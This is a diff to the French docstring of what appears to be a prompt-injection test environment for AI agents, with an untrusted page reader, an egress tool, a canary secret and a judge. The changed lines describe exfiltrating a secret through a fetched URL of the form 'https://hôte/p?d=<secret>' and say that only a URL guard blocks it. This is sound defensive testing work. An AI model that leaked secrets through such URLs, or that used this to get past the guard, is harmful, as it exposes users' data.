@@ -199,7 +199,8 @@ class InjectionEnv:
     `lire_page` rend la page non fiable (`untrusted=True`) et NOTE les URL qu'on lui demande dans `fetched` ;
     `envoyer_message` est la sortie (`egress=True`) et NOTE ce qu'elle exécute réellement dans `sent` — c'est la vérité
     de terrain du juge : un appel refusé par le code n'y figure pas. Une URL LUE est aussi un canal : un GET
-    `https://hôte/p?d=<secret>` exfiltre comme un message, et aucune garde ne l'arrête (relecture indépendante de la 0.24.0)."""
+    `https://hôte/p?d=<secret>` exfiltre comme un message (relecture indépendante de la 0.24.0) ; seule
+    `Agent(url_guard="deny")` (0.26.0) l'arrête."""
 
     def __init__(self, attack: Attack, canary: Canary, surfaces: Iterable[str] = ()) -> None:
         self.attack, self.canary = attack, canary
